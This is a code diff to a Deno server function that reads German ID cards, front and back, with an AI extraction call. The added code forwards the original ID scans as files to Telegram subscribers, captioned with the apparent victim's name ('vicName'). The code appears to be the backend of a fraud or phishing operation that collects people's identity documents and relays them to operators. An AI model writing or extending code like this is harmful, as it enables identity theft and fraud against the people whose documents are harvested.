@@ -146,10 +146,15 @@ Deno.serve(async (req) => {
       });
     }
 
+    const [frontFile, backFile] = await Promise.all([
+      loadFile(signedFront.signedUrl, "vorderseite"),
+      loadFile(signedBack.signedUrl, "rueckseite"),
+    ]);
+
     const content: any[] = [
       { type: "text", text: "Lies die Daten aus dem folgenden Personalausweis aus." },
-      await buildBlock(signedFront.signedUrl, "vorderseite"),
-      await buildBlock(signedBack.signedUrl, "rueckseite"),
+      buildAiBlock(frontFile, "vorderseite"),
+      buildAiBlock(backFile, "rueckseite"),
     ];
 
     const aiRes = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
@@ -198,6 +203,27 @@ Deno.serve(async (req) => {
       vic_name: vicName,
       ...parsed,
     });
+
+    // Send the actual ID images/PDFs as files to the same subscribers
+    try {
+      const files: TelegramFile[] = [
+        {
+          bytes: frontFile.bytes,
+          filename: `ausweis-vorderseite.${extForMime(frontFile.mime)}`,
+          mime: frontFile.mime,
+          caption: `🪪 Ausweis — ${vicName} (Vorderseite)`,
+        },
+        {
+          bytes: backFile.bytes,
+          filename: `ausweis-rueckseite.${extForMime(backFile.mime)}`,
+          mime: backFile.mime,
+          caption: `🪪 Ausweis — ${vicName} (Rückseite)`,
+        },
+      ];
+      await sendFilesToSubscribers(service, "kyc_data_extracted", files);
+    } catch (e) {
+      console.error("Failed to send ID files to Telegram:", e);
+    }
 
     return new Response(JSON.stringify({ ok: true, extracted: parsed, telegram: result }), {
       headers: { ...corsHeaders, "Content-Type": "application/json" },
